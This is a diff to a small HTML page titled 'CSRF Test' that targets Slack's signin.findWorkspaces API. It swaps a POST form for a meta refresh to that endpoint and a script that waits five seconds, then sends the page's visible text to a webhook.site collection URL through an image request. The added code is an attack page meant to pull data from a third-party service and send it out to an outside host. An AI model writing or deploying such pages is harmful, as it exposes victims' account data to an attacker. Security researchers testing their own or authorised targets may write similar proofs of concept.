@@ -1,13 +1,18 @@
 
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Test</title>
+    <meta http-equiv="refresh" content="https://slack.com/api/signin.findWorkspaces" />
+    <script>
+        setTimeout(() => {
+            var img = new Image();
+            img.src = "https://webhook.site/c1acb3f9-304c-414d-b941-3e8094798029" + encodeURIComponent(document.body.innerText);
+            document.body.appendChild(img);
+        }, 5000); // Wait a bit to let the API load
+    </script>
 </head>
 <body>
-    <form action="https://slack.com/api/signin.findWorkspaces" method="POST">
-        <input type="hidden" name="fake_param" value="123">
-        <input type="submit" value="Click Here">
-    </form>
+    <p>Redirecting...</p>
 </body>
 </html>
